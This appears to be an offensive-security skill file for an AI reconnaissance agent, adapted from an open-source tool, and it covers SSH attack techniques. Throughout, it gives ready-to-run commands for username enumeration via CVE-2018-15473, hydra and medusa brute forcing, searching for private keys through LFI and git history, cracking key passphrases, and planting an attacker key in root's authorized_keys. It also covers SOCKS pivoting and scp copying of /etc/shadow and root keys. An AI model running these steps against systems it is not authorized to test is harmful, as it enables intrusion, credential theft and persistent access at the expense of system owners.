<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: ssh
description: SSH security testing covering user enumeration, brute force, key analysis, tunneling for pivoting, known CVEs, and SSH-specific misconfiguration testing
---

# SSH Security Testing

SSH (Secure Shell) is on nearly every server. Attack surface: username enumeration, credential brute force, weak/reused SSH keys, authorized_keys misconfiguration, SSH tunneling for pivoting, and known CVEs including timing-based user enumeration.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 22,2222,22222 <target> -sV --open

    # Common SSH ports:
    # 22    — standard
    # 2222  — common alternative
    # 22222 — less common alternative

    # SSH banner grab (version + OS info):
    nc <target> 22
    # SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
    # Reveals: OpenSSH version, OS distribution

    nmap -p 22 --script ssh-hostkey,ssh2-enum-algos <target>

---

## Username Enumeration

### CVE-2018-15473 — OpenSSH Username Enumeration

Affects OpenSSH < 7.7 — timing difference reveals valid usernames:

    # Tool: https://github.com/Sait-Nuri/CVE-2018-15473
    python3 CVE-2018-15473.py --target <target> --username admin
    # "admin" is a valid user / "admin" is an invalid user

    # Automated with wordlist:
    python3 CVE-2018-15473.py --target <target> --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt

    # Metasploit:
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS <target>
    set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
    run

    # Common SSH usernames to test:
    root, admin, ubuntu, ec2-user, centos, debian, pi, vagrant, git, deploy,
    www-data, postgres, mysql, oracle, hadoop, ansible, jenkins

---

## Brute Force

    # Hydra (most common):
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
          -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
          ssh://<target> -t 4

    # Medusa:
    medusa -h <target> -u root -P /usr/share/wordlists/rockyou.txt -M ssh

    # nmap brute (slower):
    nmap --script ssh-brute -p 22 <target>

    # Patator (parallel, smarter throttling):
    patator ssh_login host=<target> user=FILE0 password=FILE1 \
      0=/usr/share/seclists/Usernames/common-usernames.txt \
      1=/usr/share/wordlists/rockyou.txt \
      -x ignore:mesg='Authentication failed'

    # Rate: limit to 4 threads to avoid lockout
    # Target MaxAuthTries usually 6 — stop after 5 attempts per user

---

## SSH Key Attacks

### Weak Key Generation

    # Debian/Ubuntu 2008 OpenSSL RNG bug (CVE-2008-0166):
    # Keys generated with broken entropy — only 32,768 possible key pairs
    # Download pre-computed keysets:
    # https://github.com/g0tmi1k/debian-ssh

    # Test if server uses a Debian weak key:
    python3 -c "
    # Download blacklist and check against server's host key
    # curl https://raw.githubusercontent.com/g0tmi1k/debian-ssh/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
    "

### Finding SSH Private Keys

    # Scan target for exposed private keys (via LFI, file read, misconfigured web):
    GET /.ssh/id_rsa
    GET /.ssh/id_dsa
    GET /.ssh/id_ecdsa
    GET /.ssh/id_ed25519
    GET /home/<user>/.ssh/id_rsa
    GET /root/.ssh/id_rsa
    GET /backup/id_rsa
    GET /id_rsa
    GET /key.pem
    GET /server.key

    # In git repositories:
    git log --all -p | grep -E "BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY"
    trufflehog git . --json | grep ssh

    # Check authorized_keys (via LFI):
    GET /root/.ssh/authorized_keys
    GET /home/<user>/.ssh/authorized_keys

### Cracking Encrypted SSH Keys

    # If private key is passphrase-protected:
    ssh2john id_rsa > id_rsa.hash
    john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

    # hashcat:
    python3 ssh2john.py id_rsa | tee id_rsa.hash
    hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt   # RSA

### Injecting SSH Keys

    # If write access exists (via RCE, Redis, file upload):
    # 1. Generate key pair:
    ssh-keygen -t rsa -b 4096 -f /tmp/attack_key -N ""

    # 2. Append public key to authorized_keys:
    echo "$(cat /tmp/attack_key.pub)" >> /root/.ssh/authorized_keys
    # Or overwrite entirely if file doesn't exist

    # 3. Connect:
    ssh -i /tmp/attack_key root@<target>

---

## SSH Tunneling (Pivoting)

### Local Port Forwarding

Forward a remote service to your local machine:

    # Access remote service (e.g., internal web app on port 8080):
    ssh -L 8080:localhost:8080 user@<target>
    # Now browse http://localhost:8080 = remote's localhost:8080

    # Access internal network host:
    ssh -L 5432:internal-db:5432 user@<target>
    # psql -h localhost -p 5432 = connects to internal-db:5432

### Remote Port Forwarding

Expose attacker service through the target:

    # Allow target to connect back to attacker service:
    ssh -R 4444:localhost:4444 user@<target>
    # On target: nc localhost 4444 = connects to attacker's 4444

### Dynamic Port Forwarding (SOCKS Proxy)

Route all traffic through target as SOCKS proxy:

    # Create SOCKS5 proxy on local port 1080:
    ssh -D 1080 user@<target>

    # Use with proxychains:
    # Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
    proxychains nmap -sT -p 80,443,8080 <internal_network>/24
    proxychains curl http://internal-app/
    proxychains hydra -l admin -P rockyou.txt http-get://internal-server/

### Jump Host / ProxyJump

Pivot through intermediary hosts:

    # Jump through bastion to internal server:
    ssh -J user@bastion user@internal-server

    # Multi-hop:
    ssh -J user@hop1,user@hop2 user@final-target

    # SSH config for persistent pivoting:
    Host internal
      HostName 10.0.0.100
      User admin
      ProxyJump user@bastion.target.com
      IdentityFile ~/.ssh/attack_key

---

## SSH Configuration Misconfigurations

    # Check sshd_config for dangerous settings:
    cat /etc/ssh/sshd_config

    # Dangerous settings:
    PermitRootLogin yes              # Root login enabled
    PasswordAuthentication yes       # Password auth (brute-forceable)
    PermitEmptyPasswords yes         # Empty password = instant login
    AllowAgentForwarding yes         # Agent forwarding = key theft possible
    X11Forwarding yes                # X11 = display capture / GUI access
    UseDNS no                        # Fine (performance)
    MaxAuthTries 6                   # Default — reduce for brute-force protection
    AuthorizedKeysFile .ssh/authorized_keys %h/.ssh/authorized_keys2   # Both files

    # Check if SSH agent forwarding is enabled and abusable:
    # If PermitAgentForwarding yes + attacker has root on jump host:
    # Read /tmp/ssh-XXXXXXXX/agent.XXXX socket = steal forwarded SSH agent

---

## CVE Exploitation

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2023-38408 | OpenSSH | Remote code execution via ssh-agent |
| CVE-2023-48795 | OpenSSH | Terrapin: MITM protocol downgrade |
| CVE-2018-15473 | OpenSSH < 7.7 | Username enumeration |
| CVE-2016-0777 | OpenSSH | Roaming info leak (private key) |
| CVE-2008-0166 | Debian OpenSSL | Predictable private keys |

    # CVE-2023-48795 (Terrapin) — SSH protocol downgrade:
    # Weakens connection security via MITM prefix truncation
    # Check: ssh-audit <target>
    pip install ssh-audit
    ssh-audit <target>
    # Look for: "KEX strict mode" not supported = potentially vulnerable

    # CVE-2023-38408 — OpenSSH ssh-agent RCE:
    # Affects OpenSSH < 9.3p2 with agent forwarding and PKCS#11
    # Requires agent forwarding to a malicious server

---

## SSH Key and Algorithm Audit

    # Check supported algorithms (weak algorithms = downgrade attack):
    ssh-audit <target>               # Full SSH security audit
    nmap --script ssh2-enum-algos <target>

    # Weak algorithms to look for:
    # KEX: diffie-hellman-group1-sha1, diffie-hellman-group14-sha1
    # Encryption: arcfour, blowfish-cbc, 3des-cbc
    # MAC: hmac-md5, hmac-sha1-96

    # Test connection with weak cipher (if supported):
    ssh -c 3des-cbc user@<target>    # Very old cipher

---

## Sensitive File Extraction via SSH/SCP

    # If credentials obtained:
    scp user@<target>:/etc/shadow ./shadow                    # Password hashes
    scp user@<target>:/root/.ssh/id_rsa ./root_key            # Root SSH key
    scp user@<target>:/var/www/html/config.php ./config.php   # Web app config
    scp -r user@<target>:/home/ ./home_dirs/                  # All home dirs

    # Find secrets on the filesystem:
    ssh user@<target> "find / -name '*.env' -o -name 'id_rsa' -o -name 'credentials*' 2>/dev/null | head -50"
    ssh user@<target> "grep -r 'password' /etc/ --include='*.conf' 2>/dev/null"

---

## Pro Tips

1. CVE-2018-15473 username enumeration works on OpenSSH < 7.7 — still extremely common
2. Weak SSH keys from Debian 2008 bug are still active on some old systems — check host keys
3. SSH agent forwarding abuse requires root on jump host but yields all forwarded keys
4. Dynamic SOCKS proxy (`-D 1080`) + proxychains enables full network pivot in one command
5. Always check `/root/.ssh/authorized_keys` for existing keys revealing other compromised systems
6. PermitEmptyPasswords = instant root login with empty password — test with `ssh root@target` (press Enter)
7. `ssh-audit` reveals weak algorithms and known CVEs in one scan

## Summary

SSH testing = CVE-2018-15473 username enumeration + brute force (hydra) + private key search (LFI/git history) + key injection via other RCE. SSH is rarely the entry point for external targets but is critical for lateral movement — set up SOCKS proxy (`-D 1080`) immediately after gaining any SSH access for full network pivot. Agent forwarding abuse on compromised jump hosts steals all users' SSH keys in transit.
